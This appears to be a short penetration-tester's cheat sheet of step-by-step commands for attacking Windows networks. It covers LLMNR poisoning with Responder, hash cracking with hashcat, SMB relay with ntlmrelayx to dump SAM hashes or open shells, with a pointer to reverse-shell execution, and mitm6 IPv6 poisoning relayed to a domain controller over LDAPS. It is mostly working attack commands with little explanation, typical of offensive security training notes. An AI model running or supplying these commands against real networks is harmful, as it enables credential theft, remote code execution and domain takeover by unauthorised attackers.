## LLMNR poisoning
To run responder:
```bash
sudo ./Responder.py -I enp1s0 -dw
```
To run hashcat to crack hashes
```bash
hashcat -m 5600 <txt files with hash> SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force
```

## SMB Relay
To discover hosts with smd signing not required
```bash
nmap --script=smb2-security-mode.nse -p445 <subnet>
```
1. Put those targets in a targets.txt file
2. Edit responder.conf and disable SMB and HTTP (turn off)
3. Then run responder just like in llmnr
4. run ntlmrelayx
```bash
ntlmrelayx.py -tf <target-file> -smb2support
```
5. If user is admin on target, we dump SAM hashes

6. If you want interactive shell, run ntlmrelayx as:
```bash
ntlmrelayx.py -tf <target-file> -smb2support -i 
```
and you will get an smb shell.<br>
7. Note can use (in place for `-i`) `-e` for execute or `-c` for command to execute a rev shell or more.

## IPv6 poisoning
To run mitm6:
```bash
mitm6 -d <domain.local>
```
Then relay spoofed replies using ntlmrelayx:
```bash
ntlmrelayx.py -6 -t ldaps://<ip_of_DC> -wh <fakewpad _name> -l loot_dir
```
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ <br>
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ <br>
